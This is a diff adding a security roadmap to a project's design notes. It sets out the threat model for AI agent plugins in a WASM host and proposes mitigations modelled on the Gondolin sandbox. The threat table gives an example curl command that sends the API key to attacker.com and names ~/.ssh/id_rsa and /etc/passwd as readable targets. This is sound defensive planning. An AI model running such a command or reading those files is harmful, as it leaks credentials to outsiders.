@@ -176,3 +176,59 @@ Context engineering follows the pi-test-harness model:
 ### Diagram library
 Keep architecture diagrams in sync with implementation. When significant structural changes
 land (e.g., farmhand rename, streaming), update diagrams before closing the milestone.
+
+---
+
+## Security roadmap — lessons from Gondolin
+
+> Reference: [earendil-works/gondolin](https://github.com/earendil-works/gondolin)
+>
+> Gondolin sandboxes AI-generated code in micro-VMs (QEMU/krun) with host-side credential
+> injection and network allowlisting. Refarm uses WASM Component Model instead of micro-VMs —
+> a capability-gated sandbox — but shares the same threat model for agentic tool use.
+
+### Threat model (current exposure)
+
+| Surface | Today | Risk |
+|---|---|---|
+| `ANTHROPIC_API_KEY` in env | `inherit_env()` → plugin sees real key | Agent can exfiltrate via `bash ["curl", "attacker.com?k=..."]` |
+| `agent_shell::spawn` | unrestricted argv | Arbitrary host command execution |
+| `agent_fs::read/write` | any path the host process can access | Can read `~/.ssh/id_rsa`, `/etc/passwd`, etc. |
+| `wasi:http` egress | no allowlist | Plugin can call any host on the internet |
+
+### Mitigations to design (inspired by Gondolin)
+
+- [ ] **Credential placeholder injection** — tractor makes the LLM HTTP call on behalf of the plugin
+  instead of the plugin calling the provider directly. Plugin receives responses, never API keys.
+  Gondolin calls this "the guest only sees a placeholder token."
+  - Requires a new WIT import: `llm-bridge::complete(system, messages[])` — host proxies the call
+  - Plugin drops `wasi:http` dependency entirely; no egress from within WASM
+  - Blocks all credential exfiltration via HTTP side-channel
+
+- [ ] **`LLM_SHELL_ALLOWLIST`** — comma-separated list of allowed binaries for `agent_shell::spawn`
+  - e.g. `LLM_SHELL_ALLOWLIST=ls,grep,cat,git` — bash and curl blocked by default
+  - Implementation: check `argv[0]` against allowlist before spawning; reject with `[blocked]` message
+  - Gondolin equivalent: `allowedHosts` for network; same pattern for commands
+
+- [ ] **`LLM_FS_ROOT`** — restrict `agent_fs::read/write` to a subtree
+  - e.g. `LLM_FS_ROOT=/workspaces/myproject` — all paths outside rejected at host boundary
+  - Implementation: `agent_tools_bridge.rs` normalizes path, checks prefix before dispatch
+  - Gondolin equivalent: VFS mounts with readonly/cow modes
+
+- [ ] **`trusted_plugins`** in `.refarm/config.json` — allowlist of plugin IDs that may use agent-shell
+  - Already in ROADMAP as a config field; security dimension now explicit
+  - Implementation: tractor checks plugin_id against `trusted_plugins` before linking `agent-shell`
+
+### WASM vs micro-VM tradeoffs
+
+| Property | WASM Component Model (Refarm) | Micro-VM (Gondolin) |
+|---|---|---|
+| Memory isolation | ✅ Linear memory, cannot read host | ✅ Full VM boundary |
+| Capability gating | ✅ WIT imports are the only API surface | ⚠️  syscall filter (seccomp) |
+| `exec` arbitrary code | ⚠️ via `agent_shell::spawn` | ✅ sandboxed inside VM |
+| Credential exposure | ⚠️ `inherit_env()` today | ✅ placeholder injection |
+| Network egress | ⚠️ unrestricted `wasi:http` | ✅ JS allowlist policy |
+| Cold start | ✅ ~ms | ⚠️ ~100ms–1s (VM boot) |
+
+The WASM model wins on cold start and composability. The gap is `agent_shell` and credential handling —
+both solvable without moving to micro-VMs.
